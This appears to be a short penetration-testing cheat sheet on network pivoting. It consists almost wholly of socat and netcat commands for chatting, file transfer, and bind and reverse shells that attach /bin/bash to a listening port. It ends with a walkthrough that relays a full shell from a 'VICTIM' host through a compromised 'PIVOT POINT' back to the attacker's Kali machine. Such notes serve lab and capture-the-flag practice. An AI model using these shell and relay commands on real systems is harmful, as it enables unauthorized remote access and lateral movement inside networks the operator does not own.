
> [!NOTE] The following is new content
> 

# Basic Pivoting

These methods work in both directions so adapt them according to the scenario

#Chatting

```sh
# SERVER
socat TCP4-LISTEN:1234 STDOUT


nc -nlvp 4444 
```

```sh
# CLIENT
socat STDIN TCP4:SERVER_IP:1234


nc -nv SENDER_IP 4444
```

#Shells

```sh
# SENDER
socat TCP4-LISTEN:1234 EXEC:/bin/bash
socat -d -d TCP4-LISTEN:443 STDOUT


nc -nlvp 4444 -e /bin/bash
```

```sh
# RECIEVER
socat STDIN TCP4:SENDER_IP:1234
socat TCP4:SENDER_IP:443 EXEC:/bin/bash


nc -nv SENDER_IP 4444
```

#File #Transfer

```sh
# SENDER
socat FILE:filename.txt TCP4-LISTEN:1234,fork


nc -nlvp 4444 > incomming.exe
```

```sh
# RECIEVER
socat - TCP4:SENDER_IP:1234 > output.file
socat TCP4:SENDER_IP:1234 FILE:receive-filename.txt,create


nc -nv SENDER_IP 4444 < incomming.exe
```

### Reverse Shell Over Pivot

> If the compromised server is `192.168.217.129 (PIVOT POINT)` and the target is `192.168.45.129 (VICTIM)`,
> Using a pivot technique seen previously we managed to get an (incomplete) shell on the target machine.
> 
> Then we could use the following commands to get a complete shell on the target machine:

- First on the target pc

```c
# VICTIM
socat TCP4-LISTEN:1234 EXEC:/bin/bash
```

- Next on the compromised pc (PIVOT POINT)

```C
# PIVOT POINT
socat TCP4-LISTEN:3333 TCP4:VICTIM_IP:1234

socat TCP4-LISTEN:3333 TCP4:192.168.45.129:1234
```

- Finally on our own attacking pc

```c
# KALI
socat STDIN TCP4:PIVOT_POINT_IP:3333

socat STDIN TCP4:192.168.217.129:3333
```

